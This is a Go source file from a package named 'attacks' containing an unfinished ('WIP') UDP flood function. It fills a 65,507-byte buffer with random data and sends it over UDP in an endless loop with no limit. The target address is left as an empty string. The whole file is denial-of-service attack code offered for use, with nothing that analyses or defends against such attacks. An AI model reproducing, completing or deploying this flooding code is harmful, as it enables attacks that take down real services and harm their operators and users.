package attacks

import (
	"fmt"
	"log"
	"math/rand"
	"net"
)

// WIP
func UdpFlood() {
	// Max size for UDP packets
	b := make([]byte, 65507)

	conn, err := net.Dial("udp", fmt.Sprintf(""))

	if err != nil {
		return
	}

	_, err = rand.Read(b)

	if err != nil {
		log.Println(err)
		return
	}

	for {
		conn.Write(b)
	}
}
